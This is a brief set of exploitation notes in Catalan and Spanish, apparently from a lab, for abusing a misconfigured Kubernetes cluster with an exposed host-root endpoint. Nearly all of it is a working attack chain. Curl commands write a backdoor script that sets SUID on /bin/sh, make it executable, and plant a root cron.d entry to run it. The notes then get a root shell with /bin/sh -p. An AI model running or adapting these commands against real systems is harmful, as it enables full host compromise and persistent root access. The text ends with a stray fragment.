## Explotació de la mala configuració
- Cluster segur: 192.168.58.2
- Cluster insegur: 192.168.49.2

# 1. Sube un script que dé SUID a /bin/sh
cat <<EOF > /tmp/backdoor.sh
#!/bin/bash
chmod u+s /bin/sh
EOF

curl -X POST --data-binary @/tmp/backdoor.sh \
http://192.168.49.2:30080/host-root/tmp/backdoor.sh

# 2. Hazlo ejecutable
curl -X POST http://192.168.49.2:30080/host-root/bin/chmod \
--data "755 /tmp/backdoor.sh"

# 3. Ejecútalo mediante cron
echo "* * * * * root /tmp/backdoor.sh" | \
curl -X POST --data-binary @- \
http://192.168.49.2:30080/host-root/etc/cron.d/exploit

# 4. Espera 1 minuto y accede
/bin/sh -p
cle

